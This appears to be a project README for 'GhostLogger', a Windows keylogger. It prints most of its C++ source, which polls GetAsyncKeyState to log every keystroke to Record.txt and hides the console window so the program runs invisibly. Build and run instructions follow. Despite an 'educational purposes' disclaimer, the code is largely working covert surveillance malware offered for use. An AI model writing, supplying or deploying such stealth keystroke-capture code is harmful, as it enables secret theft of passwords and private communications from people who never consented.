# GhostLogger 👻🖥️

Welcome to **GhostLogger**, a stealthy and efficient keylogging application for Windows! Designed for educational purposes and to demonstrate low-level Windows programming techniques, GhostLogger captures and records keystrokes in a hidden manner.

## Features 🌟
- **Stealth Mode**: Runs invisibly in the background.
- **Comprehensive Key Logging**: Captures a wide range of keys, including alphabetic characters, numeric keys, function keys, control keys, and special characters.
- **Log File**: Records all keystrokes in `Record.txt`.

## Project Structure 📁
```
GhostLogger
├───.vscode
│   ├───c_cpp_properties.json
│   ├───settings.json
│   └───tasks.json
└───src
    ├───main.cpp
    └───Record.txt
```

## How It Works 🛠️
The main functionality is encapsulated in `main.cpp`, which includes the following key components:
- **KeyLogger**: A function that captures keystrokes using `GetAsyncKeyState` and writes them to `Record.txt`.
- **hide_exe**: A function that hides the console window to ensure the program runs invisibly.

### Code Overview 👨‍💻
Here's a brief look at the core code in `main.cpp`:

```cpp
#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>

// Function prototypes
void KeyLogger(void);
void hide_exe();

// main function
int main(void)
{
    hide_exe();
    KeyLogger();
}

// function to capture the keystrokes
void KeyLogger(void)
{
    char character;

    while (true)
    {
        for (character = 8; character <= 222; character++)
        {
            if (GetAsyncKeyState(character) == -32767)
            {
                std::ofstream write("Record.txt", std::ios::app);
                if (character > 64 && character < 91 && !GetAsyncKeyState(0x10))
                {
                    character += 32;
                    write << character;
                }
                else if (character > 64 && character < 91)
                {
                    write << character;
                }

                switch (character)
                {
                    case 39: // '
                        write << (GetAsyncKeyState(0x10) ? "\"" : "'");
                        break;
                    case 44: // ,
                        write << (GetAsyncKeyState(0x10) ? "<" : ",");
                        break;
                    // ... handle other cases ...
                    case VK_RETURN: // ENTER key
                        write << " <Enter> " << std::endl;
                        break;
                    case 32: // Space key
                        write << " ";
                        break;
                    // ... handle other cases ...
                }
            }
        }
    }
}

// function to hide the exe file.
void hide_exe()
{
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
}
```

## Getting Started 🚀
To run GhostLogger on your machine, follow these steps:

1. **Clone the Repository**:
   ```sh
   git clone https://github.com/yourusername/GhostLogger.git
   ```
2. **Open in VSCode**:
   ```sh
   code GhostLogger
   ```
3. **Build and Run**:
   - Make sure you have a C++ compiler installed.
   - Compile and run `main.cpp` using your preferred method or directly through VSCode's built-in tasks.

## Usage ⚙️
- Once the program is running, it will operate in the background, logging all keystrokes to `Record.txt`.
- To stop the program, you will need to end the process through Task Manager or by terminating it via your development environment.

## Legal Disclaimer ⚖️
This project is intended for educational purposes only. Unauthorized use of keylogging software is illegal and unethical. Always ensure you have explicit permission before using this software on any device.

## Connect with Me 🌐
I'm always looking to expand my professional network and explore new opportunities. Let's connect!
- [LinkedIn](https://www.linkedin.com/in/yourprofile)
- [Twitter](https://twitter.com/yourhandle)
- [Email](mailto:youremail@example.com)

## License 📜
This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

---

Made with ❤️ by [Your Name](https://github.com/yourusername)

Happy Coding! 🎉
